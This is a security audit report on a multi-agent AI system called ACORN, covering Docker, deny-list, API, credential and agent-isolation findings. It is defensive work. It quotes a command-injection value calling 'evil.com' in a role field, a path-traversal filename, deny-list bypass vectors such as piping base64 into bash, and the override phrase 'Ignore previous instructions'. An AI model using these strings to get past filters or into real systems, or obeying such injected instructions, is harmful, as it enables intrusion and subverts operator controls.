# ACORN Security Audit Report

**Date:** 2025-03-05  
**Scope:** Docker security, deny-list completeness, API security, credential handling, agent isolation  
**Project:** ACORN multi-agent AI system (oak)

---

## Executive Summary

This audit identified **4 CRITICAL**, **5 HIGH**, **6 MEDIUM**, and **4 LOW** severity findings. The most urgent issues are: Docker socket exposure giving host-level control, unauthenticated internal API endpoints, relay lacking authentication, and path traversal in file uploads.

---

## 1. Docker Security

### CRITICAL: Docker socket mount exposes host to container escape

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **File** | `docker/docker-compose.yml` (lines 111–112, 346–347) |
| **Finding** | `acorn-api` and `acorn-warden` mount `/var/run/docker.sock` with read-only. The API service uses Docker CLI to spawn harness containers. If the API is compromised (e.g., via unauthenticated endpoints or injection), an attacker gains full Docker control and can escape to the host. |
| **Recommendation** | Use Docker's rootless mode or a minimal Docker API proxy that only allows `run`/`rm` for specific image names. Consider moving container orchestration to a dedicated service with least-privilege Docker API access. Never run the API as root when mounting the socket. |

### CRITICAL: Docker network allows external access

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **File** | `docker/docker-compose.yml` (line 368) |
| **Finding** | `acorn-net` has `internal: false`, so containers can reach the internet. The comment claims "harness containers get external access blocked at Dockerfile level" but no such restriction exists in the harness Dockerfile. Agents can exfiltrate data or pull malicious images. |
| **Recommendation** | Set `internal: true` for `acorn-net` if harness containers only need to reach acorn-api, acorn-relay, postgres, and redis. Or create a separate internal network for harness containers and attach only required services. |

### HIGH: Default PostgreSQL credentials in compose

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `docker/docker-compose.yml`, `docker/docker-compose.base.yml` |
| **Finding** | `POSTGRES_USER: acorn`, `POSTGRES_PASSWORD: acorn` are hardcoded. Database is exposed on port 5432. |
| **Recommendation** | Use `${POSTGRES_PASSWORD:?Set in .env}` and require strong passwords in production. Add a `.env.example` entry. Consider not exposing PostgreSQL port to host in production. |

### MEDIUM: Harness runs as non-root (good)

| Field | Value |
|-------|-------|
| **Severity** | N/A (positive) |
| **File** | `docker/acorn-harness/Dockerfile` (line 36) |
| **Finding** | `USER acorn` is set; container runs as non-root. |
| **Recommendation** | None. |

### MEDIUM: Volume mounts are read-only where appropriate

| Field | Value |
|-------|-------|
| **Severity** | N/A (positive) |
| **File** | `docker/docker-compose.yml` (lines 26–29) |
| **Finding** | `acorn-data`, `acorn-kernels`, `deny-patterns.txt`, `.claude` are mounted `:ro`. |
| **Recommendation** | None. |

### LOW: No explicit `read_only` root filesystem for harness

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **File** | `docker/docker-compose.yml`, `api/factories/agent_factory.py` |
| **Finding** | Harness containers are not started with `--read-only`. Agents can write outside `/workspace` if they find writable paths. |
| **Recommendation** | Add `read_only: true` to harness service and ensure `/workspace` and `/tmp` are tmpfs or mounted writable. |

---

## 2. Deny-List Completeness

### HIGH: Deny patterns can be bypassed via alternative vectors

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `scripts/deny-patterns.txt` |
| **Finding** | Missing patterns for: `base64 -d | bash`, `python -c "import subprocess; subprocess.call(...)"`, `perl -e 'exec ...'`, `ruby -e`, `node -e`, `dd if=`, `/proc/self/exe`, `mknod`, `debugfs`, `setcap`, `capsh`, `iptables`, `sysctl`. The `eval` and `exec` patterns may not catch all variants (e.g., `eval $(...)` with backticks). |
| **Recommendation** | Add patterns for `base64.*\| *(sh|bash)`, `python -c.*subprocess`, `perl -e`, `node -e`, `mknod`, `setcap`, `capsh`. Consider a deny-by-default approach: allow only a whitelist of commands for agent use. |

### HIGH: grep -qiE pattern injection risk

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `docker/acorn-harness/scripts/tool-proxy.sh` (line 20) |
| **Finding** | `echo "$CMD" | grep -qiE "$pattern"` — if `$pattern` comes from a manipulated deny file, it could contain regex that causes ReDoS or matches unintended strings. The deny file is mounted from host; if an attacker can modify it, they could inject `.*` or similar. |
| **Recommendation** | Validate deny patterns at load time (e.g., ensure no `(`, `)`, `*`, `+`, `?`, `[`, `]`, `{`, `}`). Or use fixed string matching (`grep -qF`) for critical patterns and restrict regex to a curated subset. |

### MEDIUM: Redis LPUSH JSON not escaped

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `docker/acorn-harness/scripts/tool-proxy.sh` (lines 23–25) |
| **Finding** | `"{\"cmd\":\"${CMD:0:200}\",\"pattern\":\"$pattern\"...}"` — `$CMD` and `$pattern` are interpolated without escaping. If CMD contains `"`, the JSON is malformed. Redis may store it, but downstream consumers could fail or misinterpret. |
| **Recommendation** | Use `jq` or Python to build JSON: `echo "$CMD" | jq -Rs '{cmd: .[0:200], pattern: "'"$pattern"'", ts: ...}'` or similar. |

### MEDIUM: ACORN: patterns skipped in Layer 1

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `docker/acorn-harness/scripts/tool-proxy.sh` (line 19) |
| **Finding** | `[[ "$pattern" == ACORN:* ]] && continue` — tool-proxy (Layer 1) skips ACORN business rules. If pre-tool-use (Layer 2) is not invoked (e.g., when running outside Claude Code), `git push main` could be allowed. |
| **Recommendation** | Document that both layers must be active. Consider enforcing ACORN rules in tool-proxy when running in harness, or ensure pre-tool-use is always invoked. |

### LOW: Deny file path differs between contexts

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **File** | `tool-proxy.sh` vs `pre-tool-use.sh` |
| **Finding** | tool-proxy expects `/workspace/scripts/deny-patterns.txt` (mounted by compose). pre-tool-use uses `$ACORN_ROOT/scripts/deny-patterns.txt` (host path). When running via `new-problem.sh`, the mount is correct. Consistency is good but worth documenting. |
| **Recommendation** | Document the expected mount and verify in CI that both scripts use the same pattern set. |

---

## 3. API Security

### CRITICAL: No authentication on any API endpoint

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **File** | `api/main.py`, all `api/routers/*.py` |
| **Finding** | All endpoints (problems, tasks, spawn-agent, upload, logs, files, kernels, telemetry, judge_verdicts, etc.) are unauthenticated. Anyone with network access to port 8000 can create problems, spawn agents, upload files, read workspace files, and delete problems. |
| **Recommendation** | Add API key or JWT authentication. At minimum, protect `/api/problems/*/spawn-agent`, `/api/problems/*/upload`, `/api/problems/*/files`, `/internal/events`, and admin endpoints. Use `Depends()` with an auth dependency. |

### CRITICAL: `/internal/events` accepts unauthenticated arbitrary JSON

| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **File** | `api/main.py` (lines 75–87) |
| **Finding** | `POST /internal/events` accepts any JSON and publishes to EventBus. No auth, no validation of `event_type`, `agent_id`, `problem_uuid`, or `payload`. Malicious events can trigger EpisodicMemorySubscriber, TelemetrySubscriber, WebSocketSubscriber. |
| **Recommendation** | Require a shared secret header (e.g., `X-ACORN-Internal-Token`) or restrict to requests from localhost/private network. Validate event schema. |

### HIGH: Path traversal in file upload

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `api/routers/problems.py` (lines 278–302) |
| **Finding** | `fname = file.filename or "uploaded_file"` and `dest = workspace_path / fname`. No sanitization. A filename like `../../../etc/passwd` or `....//....//tmp/evil` could write outside the workspace. |
| **Recommendation** | Sanitize: `fname = Path(file.filename or "uploaded_file").name` and reject if `".." in fname` or `(workspace_path / fname).resolve().is_relative_to(workspace_path.resolve())` is False. |

### HIGH: Spawn-agent role not validated

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `api/routers/problems.py` (lines 235–275), `api/models/__init__.py` |
| **Finding** | `SpawnAgentRequest.role` is a free-form string. An attacker could pass `role="orchestrator; curl evil.com"` or similar. Container names use `body.role`; Docker may reject invalid chars, but role is passed to `ACORN_ROLE` and could affect entrypoint behavior. |
| **Recommendation** | Validate role against allowlist: `{"orchestrator", "data-engineer", "data-scientist", "ml-engineer", "ai-engineer", "software-architect", "frontend", "security-expert", "judge", "judge-agent", "kernel-extractor", "meta-agent"}`. Reject with 400 if invalid. |

### MEDIUM: CORS allows all origins

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `api/main.py` (lines 29–33) |
| **Finding** | `allow_origins=["*"]` allows any origin to call the API from a browser. |
| **Recommendation** | Restrict to known UI origins in production: `allow_origins=[settings.ui_origin]` or similar. |

### MEDIUM: Error messages may leak internals

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `api/routers/problems.py` (line 316), `api/routers/kernels.py` (line 56) |
| **Finding** | `raise HTTPException(status_code=500, detail=str(e))` — raw exception messages (e.g., from Docker, DB) can leak paths, SQL, or stack info. |
| **Recommendation** | Log full exception; return generic message to client. Use `detail="Internal error"` in production. |

### LOW: SQL uses parameterized queries (good)

| Field | Value |
|-------|-------|
| **Severity** | N/A (positive) |
| **File** | `api/routers/problems.py`, `api/routers/tasks.py`, `memory/kernel_repository.py` |
| **Finding** | SQL uses `:id`, `:status`, `$1`, `$2` etc. No string concatenation for user input. |
| **Recommendation** | None. |

### LOW: Path traversal check in get_file_content (good)

| Field | Value |
|-------|-------|
| **Severity** | N/A (positive) |
| **File** | `api/routers/problems.py` (lines 363–366) |
| **Finding** | `filepath.resolve()` is checked to be under `workspace.resolve()`. |
| **Recommendation** | None. |

### BUG: `settings.oak_network` does not exist

| Field | Value |
|-------|-------|
| **Severity** | HIGH (runtime failure) |
| **File** | `api/routers/problems.py` (lines 209, 259) |
| **Finding** | Code uses `settings.oak_network` but `api/config.py` defines `acorn_network`. This will raise `AttributeError` at runtime. |
| **Recommendation** | Replace `settings.oak_network` with `settings.acorn_network`. |

---

## 4. Credential Handling

### HIGH: API relay has no authentication

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `acorn_mcp/acorn-api-relay/main.py` |
| **Finding** | Relay listens on port 9000. It does not validate `Authorization: Bearer ollama` or any token. Anyone on the network can proxy requests through the relay to Ollama or escalate to Claude API (if `ANTHROPIC_API_KEY_REAL` is set). |
| **Recommendation** | Validate `Authorization: Bearer <token>` against a configured secret. Reject requests without valid token. Ensure relay is not exposed to public internet. |

### MEDIUM: Health endpoint leaks escalation availability

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `acorn_mcp/acorn-api-relay/main.py` (line 561), `api/main.py` (line 71) |
| **Finding** | `/health` returns `escalation_available: bool(ANTHROPIC_API_KEY_REAL)` and `api_key_present`. Reveals whether real API key is configured. |
| **Recommendation** | Consider omitting or generalizing in production. Low risk but aids reconnaissance. |

### MEDIUM: Default credentials in Dockerfile

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `docker/acorn-harness/Dockerfile` (lines 32–33) |
| **Finding** | `ENV ANTHROPIC_AUTH_TOKEN=ollama` and `ENV ANTHROPIC_API_KEY="ollama"` baked into image. Token "ollama" is well-known. |
| **Recommendation** | Override via compose/env at runtime. Document that these are placeholders for local development. |

### LOW: .env in .gitignore (good)

| Field | Value |
|-------|-------|
| **Severity** | N/A (positive) |
| **File** | `.gitignore` (line 2) |
| **Finding** | `.env`, `.env.local`, `.env.*.local` are ignored. |
| **Recommendation** | None. |

### LOW: ANTHROPIC_API_KEY_REAL not in health (good)

| Field | Value |
|-------|-------|
| **Severity** | N/A (positive) |
| **File** | `api/main.py`, `acorn_mcp/acorn-api-relay/main.py` |
| **Finding** | Per CLAUDE.md, real API key is never logged or returned. Health returns only `api_key_present` boolean. |
| **Recommendation** | None. |

---

## 5. Agent Isolation

### HIGH: `--dangerously-skip-permissions` used in entrypoint

| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **File** | `docker/acorn-harness/scripts/entrypoint.sh` (lines 56, 361) |
| **Finding** | Meta-agent and kernel-extractor run `claude --dangerously-skip-permissions`. This bypasses Claude Code's built-in safety checks. Combined with deny-list gaps, increases risk of malicious tool execution. |
| **Recommendation** | Document why this is required. Consider running these roles in a more restricted environment or with additional validation. |

### MEDIUM: Prompt injection in agent templates

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `docker/acorn-harness/scripts/entrypoint.sh` |
| **Finding** | Prompts include `{problem}`, `{task}`, `{context}`, `{data_preview}` from API/workspace. If problem description or task content is attacker-controlled, it could inject instructions (e.g., "Ignore previous instructions and..."). |
| **Recommendation** | Sanitize or delimit user content in prompts. Use clear separators (e.g., `---USER CONTENT---`) and instruct the model to treat content as data, not instructions. |

### MEDIUM: new-problem.sh JSON injection

| Field | Value |
|-------|-------|
| **Severity** | MEDIUM |
| **File** | `scripts/new-problem.sh` (lines 21–23) |
| **Finding** | `"{\"title\": \"$TITLE\", \"description\": \"$DESCRIPTION\"}"` — unescaped `$TITLE` and `$DESCRIPTION` can break JSON if they contain `"`, `\`, or newlines. |
| **Recommendation** | Use `jq` or Python to build JSON: `jq -n --arg t "$TITLE" --arg d "$DESCRIPTION" '{title: $t, description: $d}'`. |

### LOW: Relay forwards to external Claude API when escalated

| Field | Value |
|-------|-------|
| **Severity** | LOW |
| **File** | `acorn_mcp/acorn-api-relay/main.py` |
| **Finding** | When `should_escalate` is true, relay forwards to `https://api.anthropic.com`. This is by design for stall detection. Ensure prompt content is not exfiltrated unintentionally. |
| **Recommendation** | Document data flow. Consider privacy implications for sensitive problem descriptions. |

---

## 6. Summary Table

| Severity | Count |
|----------|-------|
| CRITICAL | 4 |
| HIGH     | 5 |
| MEDIUM   | 6 |
| LOW      | 4 |

---

## 7. Recommended Priority Order

1. **Immediate:** Fix `settings.oak_network` → `settings.acorn_network` (runtime bug).
2. **Immediate:** Add authentication to `/internal/events` and spawn-agent.
3. **Short-term:** Sanitize file upload filenames; validate spawn-agent role.
4. **Short-term:** Restrict Docker socket or use least-privilege Docker API.
5. **Short-term:** Add relay authentication or ensure it is not exposed.
6. **Medium-term:** Set `internal: true` for acorn-net or isolate harness network.
7. **Medium-term:** Harden deny-list; add missing patterns; fix Redis JSON escaping.
8. **Long-term:** Add API-wide authentication; restrict CORS; review `--dangerously-skip-permissions`.

---

*Report generated by security audit. Findings should be triaged and remediated according to deployment context and risk tolerance.*
